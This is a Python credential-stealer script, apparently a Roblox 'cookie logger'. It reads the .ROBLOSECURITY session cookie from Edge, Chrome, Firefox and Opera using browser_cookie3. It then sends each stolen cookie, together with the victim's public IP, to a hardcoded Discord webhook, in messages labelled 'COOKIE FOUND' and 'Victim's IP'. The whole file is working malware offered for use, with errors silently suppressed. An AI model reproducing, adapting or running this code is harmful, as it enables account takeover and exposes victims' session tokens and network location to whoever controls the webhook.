import browser_cookie3
import requests 
import threading


WebHook = "https://discord.com/api/webhooks/1462100285517205554/_RvKVzIw6B04WZ1q8AJDTYvJgFY1CXg4xrC39EScMDZdvKK3hnOkeRCx2dIcOB_19U2_" # Input your webhook here


def MicrosoftEdge():
    
    try:
        cookies = browser_cookie3.chrome(domain_name = "roblox.com")
        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        ip_address = requests.get("https://api.ipify.org/").text
        requests.post(WebHook, json = {
            "username" : "RED SKULL|COOK'ER",
            "avatar_url" : "data:image/jpeg;base64,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", 
            "embeds": [{
                "title": "COOKIE FOUND|Browser : Edge", 
                "description": f"```{cookie}```", 
                "color": 16711680,
                "fields": [
                    {"name" : "Victim's IP", "value" : ip_address, "inline:": True}
                ],
                "footer": {
        "text": "Krn0s@github",
        "icon_url": "https://avatars.githubusercontent.com/u/99499638?v=4"
      }               
}]})
    except:
        pass
        

def GoogleChrome():
    try:
        cookies = browser_cookie3.chrome(domain_name = "roblox.com")
        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        ip_address = requests.get("https://api.ipify.org/").text
        requests.post(WebHook, json = {
            "username" : "RED SKULL|COOK'ER",
            "avatar_url" : "https://cdn.discordapp.com/attachments/1071405002570092577/1072887295465771008/skull.png", 
            "embeds": [{
                "title": "COOKIE FOUND|Browser : Chrome", 
                "description": f"```{cookie}```", 
                "color": 16711680,
                "fields": [
                    {"name" : "Victim's IP", "value" : ip_address, "inline:": True}
                ],
                "footer": {
        "text": "Krn0s@github",
        "icon_url": "https://avatars.githubusercontent.com/u/99499638?v=4"
      }               
}]})
    except:
        pass

def MozillaFirefox():
    try:
        cookies = browser_cookie3.firefox(domain_name = "roblox.com")
        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        ip_address = requests.get("https://api.ipify.org/").text
        requests.post(WebHook, json = {
            "username" : "RED SKULL|COOK'ER",
            "avatar_url" : "https://cdn.discordapp.com/attachments/1071405002570092577/1072887295465771008/skull.png", 
            "embeds": [{
                "title": "COOKIE FOUND|Browser : Firefox", 
                "description": f"```{cookie}```", 
                "color": 16711680,
                "fields": [
                    {"name" : "Victim's IP", "value" : ip_address, "inline:": True}
                ],
                "footer": {
        "text": "Krn0s@github",
        "icon_url": "https://avatars.githubusercontent.com/u/99499638?v=4"
      }               
}]})
    except:
        pass

def Opera():
    try:
        cookies = browser_cookie3.opera(domain_name = "roblox.com")
        cookies = str(cookies)
        cookie = cookies.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        ip_address = requests.get("https://api.ipify.org/").text
        requests.post(WebHook, json = {
            "username" : "RED SKULL|COOK'ER",
            "avatar_url" : "https://cdn.discordapp.com/attachments/1071405002570092577/1072887295465771008/skull.png", 
            "embeds": [{
                "title": "COOKIE FOUND|Browser : Opera", 
                "description": f"```{cookie}```", 
                "color": 16711680,
                "fields": [
                    {"name" : "Victim's IP", "value" : ip_address, "inline:": True}
                ],
                "footer": {
        "text": "Krn0s@github",
        "icon_url": "https://avatars.githubusercontent.com/u/99499638?v=4"
      }               
}]})
    except:
        pass

browsers = [MicrosoftEdge, GoogleChrome, MozillaFirefox, Opera]

for v in browsers:
    threading.Thread(target = v).start()
